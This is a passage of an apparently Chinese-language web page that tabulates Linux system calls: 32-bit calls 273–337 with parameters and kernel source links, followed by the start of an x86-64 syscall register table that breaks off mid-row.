found:</a></td></tr><tr><td>273</td><td>not implemented</td><td>0x111</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>274</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mbind.2.html">sys_mbind</a></td><td>0x112</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1232">mm&#x2F;mempolicy.c:1232</a></td></tr><tr><td>275</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_mempolicy.2.html">sys_get_mempolicy</a></td><td>0x113</td><td>int __user *policy</td><td>unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1348">mm&#x2F;mempolicy.c:1348</a></td></tr><tr><td>276</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_mempolicy.2.html">sys_set_mempolicy</a></td><td>0x114</td><td>int mode</td><td>unsigned long __user *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1254">mm&#x2F;mempolicy.c:1254</a></td></tr><tr><td>277</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_open.2.html">sys_mq_open</a></td><td>0x115</td><td>const char __user *name</td><td>int oflag</td><td>mode_t mode</td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25">struct mq_attr __user *attr</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L673">ipc&#x2F;mqueue.c:673</a></td></tr><tr><td>278</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_unlink.2.html">sys_mq_unlink</a></td><td>0x116</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L746">ipc&#x2F;mqueue.c:746</a></td></tr><tr><td>279</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedsend.2.html">sys_mq_timedsend</a></td><td>0x117</td><td>mqd_t mqdes</td><td>const char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">const struct timespec __user *abs_timeout</a></td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L840">ipc&#x2F;mqueue.c:840</a></td></tr><tr><td>280</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedreceive.2.html">sys_mq_timedreceive</a></td><td>0x118</td><td>mqd_t mqdes</td><td>char __user *msg_ptr</td><td>size_t msg_len</td><td>unsigned int __user *msg_prio</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">const struct timespec __user *abs_timeout</a></td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L934">ipc&#x2F;mqueue.c:934</a></td></tr><tr><td>281</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_notify.2.html">sys_mq_notify</a></td><td>0x119</td><td>mqd_t mqdes</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/siginfo.h?v=2.6.35#L259">const struct sigevent __user *notification</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L1023">ipc&#x2F;mqueue.c:1023</a></td></tr><tr><td>282</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_getsetattr.2.html">sys_mq_getsetattr</a></td><td>0x11a</td><td>mqd_t mqdes</td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25">const struct mq_attr __user *mqstat</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25">struct mq_attr __user *omqstat</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L1154">ipc&#x2F;mqueue.c:1154</a></td></tr><tr><td>283</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_load.2.html">sys_kexec_load</a></td><td>0x11b</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td><a href="http://lxr.free-electrons.com/source/include/linux/kexec.h?v=2.6.35#L61">struct kexec_segment __user *segments</a></td><td>unsigned long flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/kexec.c?v=2.6.35#L939">kernel&#x2F;kexec.c:939</a></td></tr><tr><td>284</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitid.2.html">sys_waitid</a></td><td>0x11c</td><td>int which</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/arch/ia64/include/asm/siginfo.h?v=2.6.35#L19">struct siginfo __user *infop</a></td><td>int options</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22">struct rusage __user *ru</a></td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1655">kernel&#x2F;exit.c:1655</a></td></tr><tr><td>285</td><td>not implemented</td><td>0x11d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>286</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/add_key.2.html">sys_add_key</a></td><td>0x11e</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const void __user *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L57">security&#x2F;keys&#x2F;keyctl.c:57</a></td></tr><tr><td>287</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/request_key.2.html">sys_request_key</a></td><td>0x11f</td><td>const char __user *_type</td><td>const char __user *_description</td><td>const char __user *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L149">security&#x2F;keys&#x2F;keyctl.c:149</a></td></tr><tr><td>288</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/keyctl.2.html">sys_keyctl</a></td><td>0x120</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L1338">security&#x2F;keys&#x2F;keyctl.c:1338</a></td></tr><tr><td>289</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_set.2.html">sys_ioprio_set</a></td><td>0x121</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioprio.c?v=2.6.35#L76">fs&#x2F;ioprio.c:76</a></td></tr><tr><td>290</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_get.2.html">sys_ioprio_get</a></td><td>0x122</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioprio.c?v=2.6.35#L192">fs&#x2F;ioprio.c:192</a></td></tr><tr><td>291</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init.2.html">sys_inotify_init</a></td><td>0x123</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L680">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:680</a></td></tr><tr><td>292</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_add_watch.2.html">sys_inotify_add_watch</a></td><td>0x124</td><td>int fd</td><td>const char __user *path</td><td>u32 mask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L685">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:685</a></td></tr><tr><td>293</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_rm_watch.2.html">sys_inotify_rm_watch</a></td><td>0x125</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L726">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:726</a></td></tr><tr><td>294</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/migrate_pages.2.html">sys_migrate_pages</a></td><td>0x126</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long __user *from</td><td>const unsigned long __user *to</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1273">mm&#x2F;mempolicy.c:1273</a></td></tr><tr><td>295</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html">sys_openat</a></td><td>0x127</td><td>int dfd</td><td>const char __user *filename</td><td>int flags</td><td>int mode</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L913">fs&#x2F;open.c:913</a></td></tr><tr><td>296</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdirat.2.html">sys_mkdirat</a></td><td>0x128</td><td>int dfd</td><td>const char __user * pathname</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2093">fs&#x2F;namei.c:2093</a></td></tr><tr><td>297</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknodat.2.html">sys_mknodat</a></td><td>0x129</td><td>int dfd</td><td>const char __user * filename</td><td>int mode</td><td>unsigned dev</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2012">fs&#x2F;namei.c:2012</a></td></tr><tr><td>298</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchownat.2.html">sys_fchownat</a></td><td>0x12a</td><td>int dfd</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L558">fs&#x2F;open.c:558</a></td></tr><tr><td>299</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futimesat.2.html">sys_futimesat</a></td><td>0x12b</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20">struct timeval __user *utimes</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L191">fs&#x2F;utimes.c:191</a></td></tr><tr><td>300</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatat64.2.html">sys_fstatat64</a></td><td>0x12c</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25">struct stat64 __user *statbuf</a></td><td>int flag</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L391">fs&#x2F;stat.c:391</a></td></tr><tr><td>301</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlinkat.2.html">sys_unlinkat</a></td><td>0x12d</td><td>int dfd</td><td>const char __user * pathname</td><td>int flag</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2341">fs&#x2F;namei.c:2341</a></td></tr><tr><td>302</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/renameat.2.html">sys_renameat</a></td><td>0x12e</td><td>int olddfd</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2671">fs&#x2F;namei.c:2671</a></td></tr><tr><td>303</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/linkat.2.html">sys_linkat</a></td><td>0x12f</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2470">fs&#x2F;namei.c:2470</a></td></tr><tr><td>304</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlinkat.2.html">sys_symlinkat</a></td><td>0x130</td><td>const char __user * oldname</td><td>int newdfd</td><td>const char __user * newname</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2377">fs&#x2F;namei.c:2377</a></td></tr><tr><td>305</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlinkat.2.html">sys_readlinkat</a></td><td>0x131</td><td>int dfd</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L284">fs&#x2F;stat.c:284</a></td></tr><tr><td>306</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmodat.2.html">sys_fchmodat</a></td><td>0x132</td><td>int dfd</td><td>const char __user * filename</td><td>mode_t mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L474">fs&#x2F;open.c:474</a></td></tr><tr><td>307</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/faccessat.2.html">sys_faccessat</a></td><td>0x133</td><td>int dfd</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L286">fs&#x2F;open.c:286</a></td></tr><tr><td>308</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pselect6.2.html">sys_pselect6</a></td><td>0x134</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L675">fs&#x2F;select.c:675</a></td></tr><tr><td>309</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ppoll.2.html">sys_ppoll</a></td><td>0x135</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/poll.h?v=2.6.35#L31">struct pollfd __user *ufds</a></td><td>unsigned int nfds</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *tsp</a></td><td>const sigset_t __user *sigmask</td><td>size_t sigsetsize</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L950">fs&#x2F;select.c:950</a></td></tr><tr><td>310</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unshare.2.html">sys_unshare</a></td><td>0x136</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/fork.c?v=2.6.35#L1624">kernel&#x2F;fork.c:1624</a></td></tr><tr><td>311</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_robust_list.2.html">sys_set_robust_list</a></td><td>0x137</td><td><a href="http://lxr.free-electrons.com/source/include/linux/futex.h?v=2.6.35#L69">struct robust_list_head __user *head</a></td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2351">kernel&#x2F;futex.c:2351</a></td></tr><tr><td>312</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_robust_list.2.html">sys_get_robust_list</a></td><td>0x138</td><td>int pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/futex.h?v=2.6.35#L69">struct robust_list_head __user * __user *head_ptr</a></td><td>size_t __user *len_ptr</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2373">kernel&#x2F;futex.c:2373</a></td></tr><tr><td>313</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/splice.2.html">sys_splice</a></td><td>0x139</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L1718">fs&#x2F;splice.c:1718</a></td></tr><tr><td>314</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync_file_range.2.html">sys_sync_file_range</a></td><td>0x13a</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>315</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tee.2.html">sys_tee</a></td><td>0x13b</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L2061">fs&#x2F;splice.c:2061</a></td></tr><tr><td>316</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vmsplice.2.html">sys_vmsplice</a></td><td>0x13c</td><td>int fd</td><td>const struct iovec __user *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L1692">fs&#x2F;splice.c:1692</a></td></tr><tr><td>317</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_pages.2.html">sys_move_pages</a></td><td>0x13d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/migrate.c?v=2.6.35#L1075">mm&#x2F;migrate.c:1075</a></td></tr><tr><td>318</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcpu.2.html">sys_getcpu</a></td><td>0x13e</td><td>unsigned __user *cpu</td><td>unsigned __user *node</td><td><a href="http://lxr.free-electrons.com/source/include/linux/getcpu.h?v=2.6.35#L14">struct getcpu_cache __user *cache</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1621">kernel&#x2F;sys.c:1621</a></td></tr><tr><td>319</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_pwait.2.html">sys_epoll_pwait</a></td><td>0x13f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1373">fs&#x2F;eventpoll.c:1373</a></td></tr><tr><td>320</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimensat.2.html">sys_utimensat</a></td><td>0x140</td><td>int dfd</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *utimes</a></td><td>int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L173">fs&#x2F;utimes.c:173</a></td></tr><tr><td>321</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd.2.html">sys_signalfd</a></td><td>0x141</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/signalfd.c?v=2.6.35#L265">fs&#x2F;signalfd.c:265</a></td></tr><tr><td>322</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_create.2.html">sys_timerfd_create</a></td><td>0x142</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L164">fs&#x2F;timerfd.c:164</a></td></tr><tr><td>323</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd.2.html">sys_eventfd</a></td><td>0x143</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventfd.c?v=2.6.35#L434">fs&#x2F;eventfd.c:434</a></td></tr><tr><td>324</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fallocate.2.html">sys_fallocate</a></td><td>0x144</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L">not found:</a></td></tr><tr><td>325</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_settime.2.html">sys_timerfd_settime</a></td><td>0x145</td><td>int ufd</td><td>int flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258">const struct itimerspec __user *utmr</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258">struct itimerspec __user *otmr</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L194">fs&#x2F;timerfd.c:194</a></td></tr><tr><td>326</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_gettime.2.html">sys_timerfd_gettime</a></td><td>0x146</td><td>int ufd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258">struct itimerspec __user *otmr</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L252">fs&#x2F;timerfd.c:252</a></td></tr><tr><td>327</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd4.2.html">sys_signalfd4</a></td><td>0x147</td><td>int ufd</td><td>sigset_t __user *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/signalfd.c?v=2.6.35#L211">fs&#x2F;signalfd.c:211</a></td></tr><tr><td>328</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd2.2.html">sys_eventfd2</a></td><td>0x148</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventfd.c?v=2.6.35#L409">fs&#x2F;eventfd.c:409</a></td></tr><tr><td>329</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create1.2.html">sys_epoll_create1</a></td><td>0x149</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1187">fs&#x2F;eventpoll.c:1187</a></td></tr><tr><td>330</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup3.2.html">sys_dup3</a></td><td>0x14a</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L53">fs&#x2F;fcntl.c:53</a></td></tr><tr><td>331</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe2.2.html">sys_pipe2</a></td><td>0x14b</td><td>int __user *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/pipe.c?v=2.6.35#L1101">fs&#x2F;pipe.c:1101</a></td></tr><tr><td>332</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init1.2.html">sys_inotify_init1</a></td><td>0x14c</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L640">fs&#x2F;notify&#x2F;inotify&#x2F;inotify_user.c:640</a></td></tr><tr><td>333</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv.2.html">sys_preadv</a></td><td>0x14d</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L759">fs&#x2F;read_write.c:759</a></td></tr><tr><td>334</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev.2.html">sys_pwritev</a></td><td>0x14e</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L784">fs&#x2F;read_write.c:784</a></td></tr><tr><td>335</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_tgsigqueueinfo.2.html">sys_rt_tgsigqueueinfo</a></td><td>0x14f</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2437">kernel&#x2F;signal.c:2437</a></td></tr><tr><td>336</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/perf_event_open.2.html">sys_perf_event_open</a></td><td>0x150</td><td><a href="http://lxr.free-electrons.com/source/include/linux/perf_event.h?v=2.6.35#L166">struct perf_event_attr __user *attr_uptr</a></td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td><a href="http://lxr.free-electrons.com/source/kernel/perf_event.c?v=2.6.35#L5065">kernel&#x2F;perf_event.c:5065</a></td></tr><tr><td>337</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmmsg.2.html">sys_recvmmsg</a></td><td>0x151</td><td>int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/socket.h?v=2.6.35#L72">struct mmsghdr __user *msg</a></td><td>unsigned int vlen</td><td>unsigned flags</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116">struct timespec __user *timeout</a></td><td><a href="http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2168">net&#x2F;socket.c:2168</a></td></tr></tbody></table><h4 id="4-2-64系统调用表"><a href="#4-2-64系统调用表" class="headerlink" title="4.2 64系统调用表"></a>4.2 64系统调用表</h4><table><thead><tr><th>%rax</th><th>System call</th><th>%rdi</th><th>%rsi</th><th>%rdx</th><th>%r10</th><th>%r8</th><th>%r9</th></tr></thead><tbody><tr><td>0</td><td>sys_read</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>1</td><td>sys_write</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>2</td><td>sys_open</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>3</td><td>sys_close</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>4</td><td>sys_stat</td><td>const char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>5</td><td>sys_fstat</td><td>unsigned int fd</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>6</td><td>sys_lstat</td><td>fconst char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>7</td><td>sys_poll</td><td>struct poll_fd *ufds</td><td>unsigned int nfds</td><td>long timeout_msecs</td><td></td><td></td><td></td></tr><tr><td>8</td><td>sys_lseek</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int origin</td><td></td><td></td><td></td></tr><tr><td>9</td><td>sys_mmap</td><td>unsigned long addr</td><td>unsigned long len</td><td>unsigned long prot</td><td>unsigned long flags</td><td>unsigned long fd</td><td>unsigned long off</td></tr><tr><td>10</td><td>sys_mprotect</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td></td><td></td><td></td></tr><tr><td>11</td><td>sys_munmap</td><td>unsigned long addr</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>12</td><td>sys_brk</td><td>unsigned long brk</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>13</td><td>sys_rt_sigaction</td><td>int sig</td><td>const struct sigaction *act</td><td>struct sigaction *oact</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>14</td><td>sys_rt_sigprocmask</td><td>int how</td><td>sigset_t *nset</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>15</td><td>sys_rt_sigreturn</td><td>unsigned long __unused</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>16</td><td>sys_ioctl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>17</td><td>sys_pread64</td><td>unsigned long fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>18</td><td>sys_pwrite64</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>19</td><td>sys_readv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>20</td><td>sys_writev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>21</td><td>sys_access</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>22</td><td>sys_pipe</td><td>int *filedes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>23</td><td>sys_select</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set*exp</td><td>struct timeval *tvp</td><td></td></tr><tr><td>24</td><td>sys_sched_yield</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>25</td><td>sys_mremap</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td></td></tr><tr><td>26</td><td>sys_msync</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>27</td><td>sys_mincore</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char 